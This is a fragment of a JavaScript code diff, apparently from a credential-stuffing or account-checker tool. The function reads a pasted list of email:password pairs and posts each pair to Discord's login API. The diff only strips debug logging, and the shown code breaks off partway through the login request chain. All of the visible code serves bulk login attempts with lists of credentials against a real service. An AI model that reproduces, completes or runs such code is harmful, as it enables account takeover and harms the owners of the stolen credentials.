@@ -1,14 +1,9 @@
 "use strict";
 var sp = window.superagent;
 function senddis(){
-  appendlog(sp)
-  appendlog(JSON.stringify(sp,null,2))
   var value = document.zako['email:pass'].value.split('\n');
-  appendlog(value)
   value.forEach(function (v){
-    appendlog(v)
     var dt = v.split(':');
-    appendlog(v)
     sp
     .post('https://discord.com/api/v8/auth/login')
     .set('content-type', 'application/json')
